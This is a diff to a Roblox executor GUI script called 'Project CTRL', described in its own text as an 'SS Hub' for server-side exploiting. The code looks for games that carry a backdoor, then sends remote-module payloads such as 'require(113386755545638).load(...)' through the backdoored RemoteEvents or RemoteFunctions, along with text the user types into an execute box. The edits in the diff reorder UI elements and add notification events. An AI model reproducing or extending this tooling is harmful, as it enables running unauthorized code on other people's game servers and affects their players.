@@ -7,7 +7,7 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 161 | Scripts: 31 | Modules: 0 | Tags: 0
+-- Instances: 162 | Scripts: 31 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.ScreenGui
@@ -262,61 +262,61 @@ G2L["1d"] = Instance.new("UIStroke", G2L["1b"]);
 
 
 
--- StarterGui.ScreenGui.Frame.page1.TextButton
-G2L["1e"] = Instance.new("TextButton", G2L["e"]);
+-- StarterGui.ScreenGui.Frame.page1.TextLabel
+G2L["1e"] = Instance.new("TextLabel", G2L["e"]);
 G2L["1e"]["TextWrapped"] = true;
 G2L["1e"]["BorderSizePixel"] = 0;
 G2L["1e"]["TextSize"] = 14;
+G2L["1e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
 G2L["1e"]["TextScaled"] = true;
-G2L["1e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(84, 84, 84);
+G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["1e"]["BackgroundTransparency"] = 0.5;
-G2L["1e"]["Size"] = UDim2.new(0, 343, 0, 40);
+G2L["1e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1e"]["BackgroundTransparency"] = 1;
+G2L["1e"]["Size"] = UDim2.new(0, 343, 0, 44);
 G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1e"]["Text"] = [[Untitled SS Hub]];
-G2L["1e"]["Position"] = UDim2.new(0.02216, 0, 0.43066, 0);
-
-
--- StarterGui.ScreenGui.Frame.page1.TextButton.LocalScript
-G2L["1f"] = Instance.new("LocalScript", G2L["1e"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page1.TextButton.UIStroke
-G2L["20"] = Instance.new("UIStroke", G2L["1e"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page1.TextButton.UIStroke
-G2L["21"] = Instance.new("UIStroke", G2L["1e"]);
-G2L["21"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-
-
--- StarterGui.ScreenGui.Frame.page1.TextButton.UICorner
-G2L["22"] = Instance.new("UICorner", G2L["1e"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page1.TextLabel
-G2L["23"] = Instance.new("TextLabel", G2L["e"]);
-G2L["23"]["TextWrapped"] = true;
-G2L["23"]["BorderSizePixel"] = 0;
-G2L["23"]["TextSize"] = 14;
-G2L["23"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["23"]["TextScaled"] = true;
-G2L["23"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["23"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["23"]["BackgroundTransparency"] = 1;
-G2L["23"]["Size"] = UDim2.new(0, 343, 0, 44);
-G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["23"]["Text"] = [[A SS Hub dedicated to provide necessities for SS exploiting.]];
-G2L["23"]["Position"] = UDim2.new(0.02216, 0, 0.58077, 0);
+G2L["1e"]["Text"] = [[A SS Hub dedicated to provide necessities for SS exploiting.]];
+G2L["1e"]["Position"] = UDim2.new(0.02216, 0, 0.58077, 0);
 
 
 -- StarterGui.ScreenGui.Frame.page1.TextLabel.UIStroke
-G2L["24"] = Instance.new("UIStroke", G2L["23"]);
+G2L["1f"] = Instance.new("UIStroke", G2L["1e"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page1.TextButton
+G2L["20"] = Instance.new("TextButton", G2L["e"]);
+G2L["20"]["TextWrapped"] = true;
+G2L["20"]["BorderSizePixel"] = 0;
+G2L["20"]["TextSize"] = 14;
+G2L["20"]["TextScaled"] = true;
+G2L["20"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["20"]["BackgroundColor3"] = Color3.fromRGB(84, 84, 84);
+G2L["20"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["20"]["BackgroundTransparency"] = 0.7;
+G2L["20"]["Size"] = UDim2.new(0, 343, 0, 35);
+G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["20"]["Text"] = [[Untitled SS Hub]];
+G2L["20"]["Position"] = UDim2.new(0.02216, 0, 0.44615, 0);
+
+
+-- StarterGui.ScreenGui.Frame.page1.TextButton.LocalScript
+G2L["21"] = Instance.new("LocalScript", G2L["20"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page1.TextButton.UIStroke
+G2L["22"] = Instance.new("UIStroke", G2L["20"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.page1.TextButton.UIStroke
+G2L["23"] = Instance.new("UIStroke", G2L["20"]);
+G2L["23"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+
+-- StarterGui.ScreenGui.Frame.page1.TextButton.UICorner
+G2L["24"] = Instance.new("UICorner", G2L["20"]);
 
 
 
@@ -1320,6 +1320,11 @@ G2L["a1"] = Instance.new("LocalScript", G2L["95"]);
 G2L["a1"]["Name"] = [[MainNotifier]];
 
 
+-- StarterGui.ScreenGui.Notify.ExecuteEvent
+G2L["a2"] = Instance.new("BindableEvent", G2L["95"]);
+G2L["a2"]["Name"] = [[ExecuteEvent]];
+
+
 -- StarterGui.ScreenGui.Scanner
 local function C_2()
 local script = G2L["2"];
@@ -1406,6 +1411,7 @@ local script = G2L["2"];
 	end)
 	
 	executeButton.MouseButton1Click:Connect(function()
+		script.Parent.Notify.ExecuteEvent:Fire()
 		local payload = textbox.Text
 		if payload and payload ~= "" and getgenv().confirmedBackdoor then
 			pcall(function()
@@ -1538,45 +1544,53 @@ local script = G2L["1c"];
 end;
 task.spawn(C_1c);
 -- StarterGui.ScreenGui.Frame.page1.TextButton.LocalScript
-local function C_1f()
-local script = G2L["1f"];
-	local players = game:GetService("Players")
-	local starterGui = game:GetService("StarterGui")
-	local username = players.LocalPlayer.Name
+local function C_21()
+local script = G2L["21"];
+	--// FIXED: Sound plays only ONCE + safer parent lookup
+	--// LocalScript inside your TextButton/ImageButton
 	
-	script.Parent.MouseButton1Click:Connect(function()
+	local Players = game:GetService("Players")
+	local SoundService = game:GetService("SoundService")
+	local player = Players.LocalPlayer
+	local username = player.Name
+	local button = script.Parent
+	
+	-- Safer way to get the event (works even if hierarchy changes a bit)
+	local ScreenGui = button:FindFirstAncestorOfClass("ScreenGui")
+	local ScriptRanEvent = ScreenGui and ScreenGui:FindFirstChild("Notify") and ScreenGui.Notify:FindFirstChild("ScriptRanEvent")
+	
+	-- Prevent double fires from mobile + mouse
+	local debounce = false
+	
+	button.MouseButton1Click:Connect(function()
+		if debounce then return end
+		debounce = true
+		
+		-- Show notification
+		if ScriptRanEvent then
+			ScriptRanEvent:Fire()
+		end
+		
+		-- Execute the script
 		local backdoor = getgenv().confirmedBackdoor
 		local backdoorType = getgenv().confirmedType
 		
-		if not backdoor then
-			pcall(function()
-				starterGui:SetCore("SendNotification", {
-					Title = "Project CTRL",
-					Text = "Inject first before executing!",
-					Duration = 5
-				})
-			end)
-			return
+		if backdoor and backdoorType then
+			local rawcode = 'require(113386755545638).load("' .. username .. '")'
+			
+			if backdoorType == "RemoteEvent" then
+				spawn(function() pcall(function() backdoor:FireServer(rawcode) end) end)
+			elseif backdoorType == "RemoteFunction" then
+				spawn(function() pcall(function() backdoor:InvokeServer(rawcode) end) end)
+			end
 		end
 		
-		local rawcode = 'require(113386755545638).load("' .. username .. '")'
-		
-		pcall(function()
-			if backdoorType == "RemoteEvent" then
-				backdoor:FireServer(rawcode)
-			elseif backdoorType == "RemoteFunction" then
-				backdoor:InvokeServer(rawcode)
-			end
-			
-			starterGui:SetCore("SendNotification", {
-				Title = "Project CTRL",
-				Text = "Script executed successfully!",
-				Duration = 5
-			})
-		end)
+		-- Re-enable after a tiny delay (prevents mobile double-tap issue)
+		task.wait(0.1)
+		debounce = false
 	end)
 end;
-task.spawn(C_1f);
+task.spawn(C_21);
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
 local function C_2c()
 local script = G2L["2c"];
@@ -2357,68 +2371,100 @@ task.spawn(C_81);
 -- StarterGui.ScreenGui.Notify.MainNotifier
 local function C_a1()
 local script = G2L["a1"];
-	--// ULTIMATE NOTIFICATION SCRIPT - INSTANT OVERRIDE EDITION (Silent + Instant Override)
+	--// ULTIMATE NOTIFICATION SCRIPT - INSTANT OVERRIDE + SMOOTH REPLACE EDITION
 	--// LocalScript inside your ScreenGui
+	
 	local frame = script.Parent.Frame
 	local NotifyFolder = script.Parent
+	
 	local SuccessEvent = NotifyFolder:WaitForChild("SuccessEvent")
 	local UnSuccessEvent = NotifyFolder:WaitForChild("UnSuccessEvent")
 	local ScriptRanEvent = NotifyFolder:WaitForChild("ScriptRanEvent")
+	local ExecuteEvent = NotifyFolder:WaitForChild("ExecuteEvent")
+	
 	local TweenService = game:GetService("TweenService")
 	local TWEEN_INFO = TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+	
 	local HIDDEN = UDim2.new(1, 0, 0.856, 0)
 	local VISIBLE = UDim2.new(0.752, 0, 0.861, 0)
-	-- These will cancel any ongoing tweens instantly
-	local s = Instance.new("Sound", game.SoundService)
-	s.SoundId = 'rbxassetid://7383525713'
-	s.Looped = false
-	s.Volume = 1
-	s.PlaybackSpeed = 1
-	local currentTweenIn = nil
-	local currentTweenOut = nil
+	
+	local sound = Instance.new("Sound", game.SoundService)
+	sound.SoundId = "rbxassetid://7383525713"
+	sound.Volume = 1
+	sound.Looped = false
+	
+	-- Track current tweens and hide delay
+	local currentTween = nil
 	local hideDelay = nil
-	local function notify(text)
-		-- Instantly cancel any running tweens
-		if currentTweenIn then currentTweenIn:Cancel() end
-		if currentTweenOut then currentTweenOut:Cancel() end
-		if hideDelay then hideDelay:Cancel() end
-		-- Force cancel any scheduled hide
-		hideDelay = nil
-		-- Update text immediately
-		if frame:FindFirstChild("Main") then
-			local main = frame.Main
-			if main:FindFirstChild("TextBox") then
-				main.TextBox.Text = text
-			elseif main:FindFirstChild("Text") then
-				main.Text.Text = text
+	
+	local function playNotification(text)
+		-- Cancel any running tween (in or out)
+		if currentTween then
+			currentTween:Cancel()
+			currentTween = nil
+		end
+		
+		-- Cancel scheduled hide
+		if hideDelay then
+			hideDelay:Cancel()
+			hideDelay = nil
+		end
+		
+		-- Instantly update the text (supports both TextLabel and TextBox)
+		local main = frame:FindFirstChild("Main")
+		if main then
+			local label = main:FindFirstChild("TextBox") or main:FindFirstChild("Text")
+			if label then
+				label.Text = text
 			end
 		end
-		-- Snap to hidden first (so slide-in always looks fresh)
+		
+		-- Always start from hidden position before sliding in (prevents jank)
 		frame.Position = HIDDEN
-		-- Slide in (new one overrides everything)
-		currentTweenIn = TweenService:Create(frame, TWEEN_INFO, {Position = VISIBLE})
-		currentTweenIn:Play()
-		-- Schedule auto-hide after 4 seconds (can be cancelled by new notification)
+		
+		-- Snap off-screen instantly
+		
+		-- Create and play new slide-in tween
+		currentTween = TweenService:Create(frame, TWEEN_INFO, {Position = VISIBLE})
+		currentTween:Play()
+		
+		-- Play sound
+		sound:Play()
+		
+		-- Auto-hide after 4 seconds (resettable by new notifications)
 		hideDelay = task.delay(4, function()
-			currentTweenOut = TweenService:Create(frame, TWEEN_INFO, {Position = HIDDEN})
-			currentTweenOut:Play()
+			if currentTween then
+				currentTween:Cancel()
+			end
+			currentTween = TweenService:Create(frame, TWEEN_INFO, {Position = HIDDEN})
+			currentTween:Play()
+			
+			-- Clean up when hidden
+			currentTween.Completed:Connect(function()
+				currentTween = nil
+			end)
 			hideDelay = nil
 		end)
 	end
-	-- Connections - all instantly override previous notifications
+	
+	-- All events use the same function → seamless override behavior
 	SuccessEvent.Event:Connect(function(backdoor)
 		local name = typeof(backdoor) == "Instance" and backdoor:GetFullName() or tostring(backdoor)
-		notify("Backdoor found! Backdoor name: " .. name)
-		s:Play()
+		playNotification("Backdoor found! Backdoor name: " .. name)
 	end)
+	
 	UnSuccessEvent.Event:Connect(function()
-		notify("No backdoor detected. Join a backdoored game!")
-		s:Play()
+		playNotification("No backdoor detected. Join a backdoored game!")
 	end)
+	
 	ScriptRanEvent.Event:Connect(function()
-		notify("Server-side script ran successfully!")
-		s:Play()
+		playNotification("Server-side script ran successfully!")
 	end)
+	
+	ExecuteEvent.Event:Connect(function()
+		playNotification("Executed script successfully!")
+	end)
+	
 	-- Start hidden
 	frame.Position = HIDDEN
 end;
